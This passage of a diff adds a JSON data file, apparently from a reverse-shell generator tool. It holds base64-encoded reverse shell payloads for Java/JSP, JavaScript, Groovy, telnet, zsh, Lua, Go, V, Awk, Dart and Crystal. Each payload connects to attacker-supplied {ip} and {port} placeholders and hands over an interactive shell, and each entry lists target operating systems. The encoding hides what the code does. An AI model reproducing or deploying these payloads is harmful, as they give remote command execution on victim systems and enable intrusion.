gICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmKCByICE9IG51bGwgKQ0KICAgICAgICAgICAgICAgICAgICByLmNsb3NlKCk7DQogICAgICAgICAgICAgICAgaWYoIHcgIT0gbnVsbCApDQogICAgICAgICAgICAgICAgICAgIHcuY2xvc2UoKTsNCiAgICAgICAgICAgIH0gY2F0Y2goIEV4Y2VwdGlvbiBlICl7fQ0KICAgICAgICB9DQogICAgfQ0KIA0KICAgIHRyeSB7DQogICAgICAgIFNvY2tldCBzb2NrZXQgPSBuZXcgU29ja2V0KCAie2lwfSIsIHtwb3J0fSApOyAvLyBSZXBsYWNlIHdpdGggd2FudGVkIGlwIGFuZCBwb3J0DQogICAgICAgIFByb2Nlc3MgcHJvY2VzcyA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoIHNoZWxsUGF0aCApOw0KICAgICAgICBuZXcgU3RyZWFtQ29ubmVjdG9yKHByb2Nlc3MuZ2V0SW5wdXRTdHJlYW0oKSwgc29ja2V0LmdldE91dHB1dFN0cmVhbSgpKS5zdGFydCgpOw0KICAgICAgICBuZXcgU3RyZWFtQ29ubmVjdG9yKHNvY2tldC5nZXRJbnB1dFN0cmVhbSgpLCBwcm9jZXNzLmdldE91dHB1dFN0cmVhbSgpKS5zdGFydCgpOw0KICAgICAgICBvdXQucHJpbnRsbigicG9ydCBvcGVuZWQgb24gIiArIHNvY2tldCk7DQogICAgIH0gY2F0Y2goIEV4Y2VwdGlvbiBlICkge30NCiU+DQo8L3ByZT4NCjwvYm9keT4NCjwvaHRtbD4=",
+        "meta": [
+            "windows",
+            "linux",
+            "mac"
+        ]
+    },
+    "Javascript": {
+        "command": "U3RyaW5nIGNvbW1hbmQgPSAidmFyIGhvc3QgPSAie2lwfSI7IiArDQogICAgICAgICAgICAgICAgICAgICAgICJ2YXIgcG9ydCA9IHtwb3J0fTsiICsNCiAgICAgICAgICAgICAgICAgICAgICAgInZhciBjbWQgPSAie3NoZWxsfSI7IisNCiAgICAgICAgICAgICAgICAgICAgICAgInZhciBzID0gbmV3IGphdmEubmV0LlNvY2tldChob3N0LCBwb3J0KTsiICsNCiAgICAgICAgICAgICAgICAgICAgICAgInZhciBwID0gbmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihjbWQpLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkuc3RhcnQoKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAidmFyIHBpID0gcC5nZXRJbnB1dFN0cmVhbSgpLCBwZSA9IHAuZ2V0RXJyb3JTdHJlYW0oKSwgc2kgPSBzLmdldElucHV0U3RyZWFtKCk7IisNCiAgICAgICAgICAgICAgICAgICAgICAgInZhciBwbyA9IHAuZ2V0T3V0cHV0U3RyZWFtKCksIHNvID0gcy5nZXRPdXRwdXRTdHJlYW0oKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAicHJpbnQgKCJDb25uZWN0ZWQiKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAid2hpbGUgKCFzLmlzQ2xvc2VkKCkpIHsiKw0KICAgICAgICAgICAgICAgICAgICAgICAiICAgIHdoaWxlIChwaS5hdmFpbGFibGUoKSA+IDApIisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICAgICAgc28ud3JpdGUocGkucmVhZCgpKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAiICAgIHdoaWxlIChwZS5hdmFpbGFibGUoKSA+IDApIisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICAgICAgc28ud3JpdGUocGUucmVhZCgpKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAiICAgIHdoaWxlIChzaS5hdmFpbGFibGUoKSA+IDApIisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICAgICAgcG8ud3JpdGUoc2kucmVhZCgpKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAiICAgIHNvLmZsdXNoKCk7IisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICBwby5mbHVzaCgpOyIrDQogICAgICAgICAgICAgICAgICAgICAgICIgICAgamF2YS5sYW5nLlRocmVhZC5zbGVlcCg1MCk7IisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICB0cnkgeyIrDQogICAgICAgICAgICAgICAgICAgICAgICIgICAgICAgIHAuZXhpdFZhbHVlKCk7IisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICAgICAgYnJlYWs7IisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICB9IisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICBjYXRjaCAoZSkgeyIrDQogICAgICAgICAgICAgICAgICAgICAgICIgICAgfSIrDQogICAgICAgICAgICAgICAgICAgICAgICJ9IisNCiAgICAgICAgICAgICAgICAgICAgICAgInAuZGVzdHJveSgpOyIrDQogICAgICAgICAgICAgICAgICAgICAgICJzLmNsb3NlKCk7IjsNClN0cmluZyB4ID0gIlwiXCIuZ2V0Q2xhc3MoKS5mb3JOYW1lKFwiamF2YXguc2NyaXB0LlNjcmlwdEVuZ2luZU1hbmFnZXJcIikubmV3SW5zdGFuY2UoKS5nZXRFbmdpbmVCeU5hbWUoXCJKYXZhU2NyaXB0XCIpLmV2YWwoXCIiK2NvbW1hbmQrIlwiKSI7DQpyZWYuYWRkKG5ldyBTdHJpbmdSZWZBZGRyKCJ4IiwgeCk7",
+        "meta": [
+            "linux",
+            "mac",
+            "windows"
+        ]
+    },
+    "Groovy": {
+        "command": "U3RyaW5nIGhvc3Q9IntpcH0iO2ludCBwb3J0PXtwb3J0fTtTdHJpbmcgY21kPSJ7c2hlbGx9IjtQcm9jZXNzIHA9bmV3IFByb2Nlc3NCdWlsZGVyKGNtZCkucmVkaXJlY3RFcnJvclN0cmVhbSh0cnVlKS5zdGFydCgpO1NvY2tldCBzPW5ldyBTb2NrZXQoaG9zdCxwb3J0KTtJbnB1dFN0cmVhbSBwaT1wLmdldElucHV0U3RyZWFtKCkscGU9cC5nZXRFcnJvclN0cmVhbSgpLCBzaT1zLmdldElucHV0U3RyZWFtKCk7T3V0cHV0U3RyZWFtIHBvPXAuZ2V0T3V0cHV0U3RyZWFtKCksc289cy5nZXRPdXRwdXRTdHJlYW0oKTt3aGlsZSghcy5pc0Nsb3NlZCgpKXt3aGlsZShwaS5hdmFpbGFibGUoKT4wKXNvLndyaXRlKHBpLnJlYWQoKSk7d2hpbGUocGUuYXZhaWxhYmxlKCk+MClzby53cml0ZShwZS5yZWFkKCkpO3doaWxlKHNpLmF2YWlsYWJsZSgpPjApcG8ud3JpdGUoc2kucmVhZCgpKTtzby5mbHVzaCgpO3BvLmZsdXNoKCk7VGhyZWFkLnNsZWVwKDUwKTt0cnkge3AuZXhpdFZhbHVlKCk7YnJlYWs7fWNhdGNoIChFeGNlcHRpb24gZSl7fX07cC5kZXN0cm95KCk7cy5jbG9zZSgpOw==",
+        "meta": [
+            "windows"
+        ]
+    },
+    "telnet": {
+        "command": "VEY9JChta3RlbXAgLXUpO21rZmlmbyAkVEYgJiYgdGVsbmV0IHtpcH0ge3BvcnR9IDA8JFRGIHwge3NoZWxsfSAxPiRURg==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "zsh": {
+        "command": "enNoIC1jICd6bW9kbG9hZCB6c2gvbmV0L3RjcCAmJiB6dGNwIHtpcH0ge3BvcnR9ICYmIHpzaCA+JiRSRVBMWSAyPiYkUkVQTFkgMD4mJFJFUExZJw==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Lua #1": {
+        "command": "bHVhIC1lICJyZXF1aXJlKCdzb2NrZXQnKTtyZXF1aXJlKCdvcycpO3Q9c29ja2V0LnRjcCgpO3Q6Y29ubmVjdCgne2lwfScsJ3twb3J0fScpO29zLmV4ZWN1dGUoJ3tzaGVsbH0gLWkgPCYzID4mMyAyPiYzJyk7Ig==",
+        "meta": [
+            "linux"
+        ]
+    },
+    "Lua #2": {
+        "command": "bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gIntpcH0iLCB7cG9ydH0gbG9jYWwgc29ja2V0ID0gcmVxdWlyZSgic29ja2V0IikgbG9jYWwgdGNwID0gc29ja2V0LnRjcCgpIGxvY2FsIGlvID0gcmVxdWlyZSgiaW8iKSB0Y3A6Y29ubmVjdChob3N0LCBwb3J0KTsgd2hpbGUgdHJ1ZSBkbyBsb2NhbCBjbWQsIHN0YXR1cywgcGFydGlhbCA9IHRjcDpyZWNlaXZlKCkgbG9jYWwgZiA9IGlvLnBvcGVuKGNtZCwgInIiKSBsb2NhbCBzID0gZjpyZWFkKCIqYSIpIGY6Y2xvc2UoKSB0Y3A6c2VuZChzKSBpZiBzdGF0dXMgPT0gImNsb3NlZCIgdGhlbiBicmVhayBlbmQgZW5kIHRjcDpjbG9zZSgpJw==",
+        "meta": [
+            "linux",
+            "windows"
+        ]
+    },
+    "Golang": {
+        "command": "ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXtjLF86PW5ldC5EaWFsKCJ0Y3AiLCJ7aXB9Ontwb3J0fSIpO2NtZDo9ZXhlYy5Db21tYW5kKCJ7c2hlbGx9Iik7Y21kLlN0ZGluPWM7Y21kLlN0ZG91dD1jO2NtZC5TdGRlcnI9YztjbWQuUnVuKCl9JyA+IC90bXAvdC5nbyAmJiBnbyBydW4gL3RtcC90LmdvICYmIHJtIC90bXAvdC5nbw==",
+        "meta": [
+            "linux",
+            "mac",
+            "windows"
+        ]
+    },
+    "Vlang": {
+        "command": "ZWNobyAnaW1wb3J0IG9zJyA+IC90bXAvdC52ICYmIGVjaG8gJ2ZuIG1haW4oKSB7IG9zLnN5c3RlbSgibmMgLWUge3NoZWxsfSB7aXB9IHtwb3J0fSAwPiYxIikgfScgPj4gL3RtcC90LnYgJiYgdiBydW4gL3RtcC90LnYgJiYgcm0gL3RtcC90LnY=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Awk": {
+        "command": "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC97aXB9L3twb3J0fSI7IHdoaWxlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIGM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsgfX0nIC9kZXYvbnVsbA==",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
+    "Dart": {
+        "command": "aW1wb3J0ICdkYXJ0OmlvJzsKaW1wb3J0ICdkYXJ0OmNvbnZlcnQnOwoKbWFpbigpIHsKICBTb2NrZXQuY29ubmVjdCgie2lwfSIsIHtwb3J0fSkudGhlbigoc29ja2V0KSB7CiAgICBzb2NrZXQubGlzdGVuKChkYXRhKSB7CiAgICAgIFByb2Nlc3Muc3RhcnQoJ3tzaGVsbH0nLCBbXSkudGhlbigoUHJvY2VzcyBwcm9jZXNzKSB7CiAgICAgICAgcHJvY2Vzcy5zdGRpbi53cml0ZWxuKG5ldyBTdHJpbmcuZnJvbUNoYXJDb2RlcyhkYXRhKS50cmltKCkpOwogICAgICAgIHByb2Nlc3Muc3Rkb3V0CiAgICAgICAgICAudHJhbnNmb3JtKHV0ZjguZGVjb2RlcikKICAgICAgICAgIC5saXN0ZW4oKG91dHB1dCkgeyBzb2NrZXQud3JpdGUob3V0cHV0KTsgfSk7CiAgICAgIH0pOwogICAgfSwKICAgIG9uRG9uZTogKCkgewogICAgICBzb2NrZXQuZGVzdHJveSgpOwogICAgfSk7CiAgfSk7Cn0=",
+        "meta": [
+            "linux",
+            "mac",
+            "windows"
+        ]
+    },
+    "Crystal (system)": {
+        "command": "Y3J5c3RhbCBldmFsICdyZXF1aXJlICJwcm9jZXNzIjtyZXF1aXJlICJzb2NrZXQiO2M9U29ja2V0LnRjcChTb2NrZXQ6OkZhbWlseTo6SU5FVCk7Yy5jb25uZWN0KCJ7aXB9Iix7cG9ydH0pO2xvb3B7bSxsPWMucmVjZWl2ZTtwPVByb2Nlc3MubmV3KG0ucnN0cmlwKCJcbiIpLG91dHB1dDpQcm9jZXNzOjpSZWRpcmVjdDo6UGlwZSxzaGVsbDp0cnVlKTtjPDxwLm91dHB1dC5nZXRzX3RvX2VuZH0n",
+        "meta": [
+            "linux",
+            "windows",
+            "mac"
+        ]
+    },
+    "Crystal (code)": {
+        "command": "cmVxdWlyZSAicHJvY2VzcyIKcmVxdWlyZSAic29ja2V0IgoKYyA9IFNvY2tldC50Y3AoU29ja2V0OjpGYW1pbHk6OklORVQpCmMuY29ubmVjdCgie2lwfSIsIHtwb3J0fSkKbG9vcCBkbyAKICBtLCBsID0gYy5yZWNlaXZlCiAgcCA9IFByb2Nlc3MubmV3KG0ucnN0cmlwKCJcbiIpLCBvdXRwdXQ6UHJvY2Vzczo6UmVkaXJlY3Q6OlBpcGUsIHNoZWxsOnRydWUpCiAgYyA8PCBwLm91dHB1dC5nZXRzX3RvX2VuZAplbmQ=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    }
+}
